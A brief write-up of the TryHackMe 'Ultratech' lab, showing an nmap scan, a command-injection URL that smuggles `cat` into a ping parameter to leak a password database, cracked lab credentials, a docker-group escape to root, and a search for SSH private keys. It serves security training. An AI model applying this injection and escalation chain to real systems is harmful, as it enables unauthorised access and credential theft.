
## Ultratech - tryhackme

1. Which software is using the port 8081?
```
┌──(kali㉿kali)-[~]
└─$ nmap -p 8081 -sV 10.10.244.29
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 08:22 EDT
Nmap scan report for 10.10.244.29
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
8081/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.00 seconds

```

2. Start dirbsearch. Leads to robots.txt > utech_sitemap.txt > partners.html > view source page > js/api.js > give information about its pinging. Gives username and password hash (http://10.10.244.29:8081/ping?ip=`cat%20utech.db.sqlite`) 

3. Crack it. User: r00t and password: n100906

4. ssh login and get user shell. 

5. Now, get linenum.sh from github, make it executable and run it. It shows docker is being hosted. 

6. After that, use gtfobin and use docker command to get root.
```
r00t@ultratech-prod:/tmp$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
id
id
# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# find / -name id_rsa 2> /dev/null
```
